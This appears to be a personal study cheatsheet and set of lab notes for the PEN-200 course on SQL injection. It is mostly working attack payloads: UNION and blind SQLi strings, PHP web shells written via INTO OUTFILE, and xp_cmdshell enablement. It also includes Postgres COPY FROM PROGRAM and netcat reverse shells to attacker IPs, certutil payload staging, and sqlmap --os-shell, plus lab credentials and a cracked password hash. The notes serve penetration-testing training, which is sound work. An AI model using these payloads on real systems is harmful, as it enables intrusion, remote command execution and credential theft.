---
title: "Chapter 10: SQL Injection Attacks - Code"
author: "James Heringer"
course: "PEN-200"
date: 2025-09-30
tags: [MSSQL,MySQL,SQLi]
description: SQLi Attacks"
draft: false
layout: cheatsheet
---

# SQL Injection Attacks
## MySQL - Connecting

* Connect to remote SQL instance
* Note:  when using impacket, the  HELP functionality is VERY helpful, `Enum_db`
```sql
mysql -u root -p'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
# --skip-ssl is to bypass ERROR 2026 (HY000) TLS/SSL

select version();		# Version info
select system_user();	# current database user
show databases;			# list all databases
use mysql;              # switich to DB 
show tables;            # list all tables in DB

SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';	# query user/pass

# auth string is Caching-SHA-256 algorithm (https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html)
```

## MSSQL - Connecting

MSSQL can be access via Impacket
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
# -windows-auth forces NTLM (instead of kerberos)

SELECT @@version;				# Version info
SELECT name FROM sys.databases;	# list all databases
SELECT * FROM offsec.information_schema.tables;	# QUERY tables in offsec DB
select * from offsec.dbo.users;	# QUERY all users in offsec DB
```

## Manual SQLi Exploitation

### Identify SQL Injection
* When SQL query relies on user input, we can abuse SQLi
* Always try `'` single quote first to see if error is thrown
* Next try single quote again, followed by 

    1. Try single quote first
        `'`
    2. Whitespace character needed after forward slashes 
        `offsecUser' OR 1=1 -- // `
    3. If AUTH successful, now we can use arbirtrary code if 
        `' or 1=1 in (select @@version) -- // `
    4. Dump all users data 
        `' OR 1=1 in (SELECT * FROM users) -- // `
    5. Try password column 
        `' or 1=1 in (SELECT password FROM users) -- // `
    6. Add user selection 
        `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- // `
    
### Union-based Payloads
* Enables execution of extra SELECT statement, concatenating two queries into one statement
* Two requirements to execution
    1. The injected UNION query has to include the same # of columns as the original query.
    2. The data types need to be compatible between each column.

    * To dscover the correct # of columns `' ORDER BY 1-- // `
    * The above statement orders the results by a specific column, meaning it will fail whenever the selected column does not exist. Increasing the column value by one each time, we'll discover that the table has five columns since ordering by column six returns an error.
```shell
# ORIGINAL Query
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";

# Now we find # of COLUMNS, then 
# Iteratitvely increase the ORDER BY #, until you get an error.
' ORDER BY 1-- // 
' ORDER BY 2-- // 

# Next, determine which columns are displayed using the following query.
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //   

# Attempt first attack against 5 COL table, with query match # of COL
# Dump DB name, USER, MySQL version, in 1st, 2nd, 3rd COL, leaving last 2 COL as NULL
# If output from UNION is not showing up in the correct COL, shift NULL values into other COL
%' UNION SELECT database(), user(), @@version, null, null -- // 

# List the current database
'+union+select+'A1',database(),'C3','D4','D5'--+- 

' # Enumerate information schema of current DB, to identify other tables
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- // 

' # Above query identifed USERS table, lets dump
' UNION SELECT null, username, password, description, null FROM users -- // 

########################################################
HACKTRACK commands
#######################################################
# Identify visible columns
'+union+select+'A1','B2','C3','D4','D5'--+-

# List the current database
'+union+select+'A1',database(),'C3','D4','D5'--+-

# List all tables inside current database
'+union+select+'A1',table_name,'C3','D4','D5'+from+information_schema.tables+where+table_schema=database()--+- 


# List all columns inside users table from the current database
'+union+select+'A1',column_name,'C3','D4','D5'+from+information_schema.columns+where+table_name='users'--+- 

# Exfiltrate data from columns
'+union+select+'A1',group_concat(name,'@@',username,'@@',password),'C3','D4','D5'+from+users--+-
```

### Concatenate 
- If we need to combine several columns into one, we can use ***||*** to  concatentate, or ***CONCAT()*** function
```bash
UNION SELECT CONCAT(username, password_hash) FROM users
UNION SELECT username || password_hash FROM users -- -
union SELECT username||':'||password_hash FROM users -- -
```
### Blind SQL Injections
* Query is NOT returned in-band, as we can't see the result of our query
* Time-based, or Boolean
* Generic boolean-based blind SQL injections cause the application to return different and predictable values whenever the database query returns a TRUE or FALSE result.
* Time-based blind SQL injections infer the query results by instructing the database to wait for a specified amount of time. Based on the response time, the attacker can conclude if the statement is TRUE or FALSE.

```shell
# BOOLEAN test
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //

' # Time-Based, if it hangs, it's TRUE, automate with SQLMAP
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //

```
## SQL OS Code Execution

### MSSQL 
```shell
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE; # RECONFIGURE applys the configuration against the SERVER

EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami';
```

### MySQL
* MySQL doesn't offer a direct OS CMD function
* Requires File Location to be writeable to the OS user running the DB software
* Create a WebShell, via SQL Select, to writeable file location
* SQUID box used this

```shell
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
' # Results in 
<? system($_REQUEST['cmd']); ?>

http://<IP>/tmp/webshell.php?cmd=id # Execute via WEB
# OR
curl "http://<IP>/tmp/webshell.php?cmd=whoami"  # Validate webshell works
curl "http://<IP>/tmp/webshell.php?cmd=certutil+-urlcache+-f+http://192.168.45.167/nc.exe+nc.exe" # Stage NC on target
curl "http://<IP>/tmp/webshell.php?cmd=nc.exe+192.168.45.167+4441+-e+powershell.exe"  # Connect back to our attacker
```

### Postgress  
* ` COPY shell FROM PROGRAM ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f’; `
 * 10.3.2 Q6  LAB had this SQLi blind injections
    *   `weight=1&height='%3bDROP+TABLE+IF+EXISTS+commandexec%3bCREATE+TABLE+commandexec(data+text)%3bCOPY+commandexec+FROM+PROGRAM+'/usr/bin/nc.traditional+-e+/bin/sh+192.168.45.241+4444'%3b--&age=24&gender=Male&email=test%40offsec.com  `
* * Reference Postgress Walkthroughs
	* https://www.offsec.com/blog/postgresql-exploit/
	* https://book.hacktricks.wiki/en/pentesting-web/sql-injection/postgresql-injection/index.html
## SQLMAP - Automating SQLi
```bash
# POST  request using user variable 
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user

# Burp -> take POST request, copy to file "request.txt", identify VAR for -p below , DUMP DB 
sqlmap -r request2.txt -p uid --dump

# get interactive shell
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```

# Labs
## 10.1
* 10.1.1 192.168.102.16
```sql
mysql -u root -p'root' -h 192.168.102.16 -P 3306 --skip-ssl-verify-server-cert
select user, authentication_string,plugin FROM mysql.user where user = 'offsec';
```
* 10.1.2 192.168.102.18
```sql
impacket-mssqlclient Administrator:Lab123@192.168.102.18 -windows-auth
```

##  10.3.2 Q4 
* WPSCAN found vulnerability for Perfect Survey < 1.5.2 
* Searchsploit Pefect Survey found .py code, that was hard to execute 
* `sqlmap "http://alvida-eatery.local/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --current-user --answers="follow=Y" --batch -v 0`
* user == dbadmin@localhost
* in firefox browser, check output, this didn't work in BURP
```http
http://alvida-eatery.local//wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users
```
* Found Hashed password: `$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0`
* Used KALI tool hash-identifier to identify type:  
```bash
hash-identifer $P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0
* Possible Hashs:
[+] MD5(Wordpress)

# tried Hashcat to crack, but faiiled
hashcat -m 400 -a 0  '$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0'  

# John worked
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john hash.txt --show
?:hulabaloo
```
* https://medium.com/@althubianymalek/uploading-a-shell-in-wordpress-via-sqli-entry-point-1caf441b3d9a
* Full interactive-Shell from sqlmap
* Intercept POST, save to file, then send to sqlmap with -r
* post should have item=test, at the bottom
* sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
## 10.3.2  Q5
1. Subscription form at bottom of main page, sent to BURP
2. BURP show subscription POST request  has veriable mail-list
3. Add single quote ' to end of variable `mail-list='`  - Now we get MySQL error
4. Number of COLs(6), using order 
    * `mail-list=' ORDER BY 7 -- //   # 7 threw an error so we know there's 6  COL`
    *  This command was supposed to identify columns, but I couldn't get it to work
        *  `UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5', 'a6' -- //  `  
5. Of 6 COL, only the fifth column was producing output.
6. Injected the basic PHP web Shell into 5th Column 
```shell
mail-list=' UNION SELECT  null, null, null, null, "<?php system($_GET['cmd']);?>", null INTO OUTFILE "/var/www/html/webshell.php" -- // 
```
7. The TMP directory above would change based on WebApp architecture
8. Tried /bin/sh revshell, but that didn't work
9. Issued command  to identify nc `which nc`, NC present, lets try that revshell in browser
```shell
http://192.168.194.48/webshell.php?cmd=nc%20192.168.45.241%204444%20-e%20/bin/sh
```
10. Listener on KALI received Shell, found flag in /var/www/


* mail-list=%'union select null, null,  null, database(), user(), @@version from information_schema.columns where table_schema=database() -- //   
* mail-list=%'union select  null, null,null,table_name, column_name, table_schema from information_schema.columns where table_schema=database() -- //   
* mail-list=bob@bob.com' UNION SELECT null,  null, null, user(), database(), null from information_schema.columns where table_schema=database() -- // 
* list column names,# use percentage here if you don't know what you want... 
    * `mail-list=%'union select  null, null,null,table_name, column_name, table_schema from information_schema.columns where table_schema=database() -- //   `
* trying  to dump columns we find earlier
    * `mail-list='union select  id,emails,is_donor,donor_type,status,created_at from anmial_planet.subscribers -- //   `
    * error from DB :  `SELECT command denied to user 'gollum'@'localhost' for table 'subscribers'  `

## 10.3.2  Q6
1. class submittal form at bottom of  page, I signed up! Sent to Burp POST
```shell
weight=1&height=2&age=2&gender=Male&email=bob%40bob.com
```
2. Checked for SQLi, 2nd FIELD, `height` produced an error.
`Warning</b>:  pg_query(): Query failed: ERROR:  unterminated quoted string at or n`
`LINE 1: select * from users where email like '%2'%'`
`^ in <b>/var/www/html/class.php</b> on line <b>423` 
    * PostGress DB?  
    * /var/www/html  NGINX?
3. Finding columns, looks like 6 it is, updated query: `weight=1&height=' ORDER BY 6 -- //  `
4. Enumerate/identify col?  I couldn't figure out how to enumerate POSTGRESS DB, Tables, or COL
5. Started NCAT listener, used  following syntax in BURP and sent 
    *   `weight=1&height='%3bDROP+TABLE+IF+EXISTS+commandexec%3bCREATE+TABLE+commandexec(data+text)%3bCOPY+commandexec+FROM+PROGRAM+'/usr/bin/nc.traditional+-e+/bin/sh+192.168.45.241+4444'%3b--&age=24&gender=Male&email=test%40offsec.com  `
6. I don't understand where this comes from, but maybes its a common Postgress SQL inject
7. Gemini decoded 
    * ` ' ; DROP TABLE IF EXISTS commandexec ; CREATE TABLE commandexec(data text) ; COPY commandexec FROM PROGRAM '/usr/bin/nc.traditional -e /bin/sh 192.168.45.245 443' ; --  `

* THOUGHTS: 
    * This is Blind SQLi
    * The commands are executing, but no data is in-band, so we only see errors
    * For instance, this commadn seems to have worked, but you get no feedback.
        *   `weight=1&height=' ; 	SELECT usename FROM pg_user; -- //  `
    * I guess this is why the solution is just use shell

## 10.3.2 Q7
- found login form on website at /login.aspx
- tested using  single quote, throws DB error
- Lab hint suggest to test for  DB type with time based delay.   Time based delay commands are 
```sql
# MSSQL
'; WAITFOR DELAY '0:0:5' --+-  

# MySQL
 ' AND (SELECT 5 FROM (SELECT(SLEEP(5)))a) AND '1'='1
 
 # Postgress
 ' AND 5=PG_SLEEP(5) AND '1'='1


# Blind SQLi

# listen on Kali
sudo tcpdump -i tun0 icmp   

#  send ping 
'; EXEC xp_cmdshell 'ping -n 1 192.168.45.241' --+-

# sent reverse encoded powershell shell
 ; EXEC xp_cmdshell 'powershell -e JABjAGwpaa==' --+-
 
#  Got  RevShell  online
whoami 
nt service\mssql$sqlexpress


```


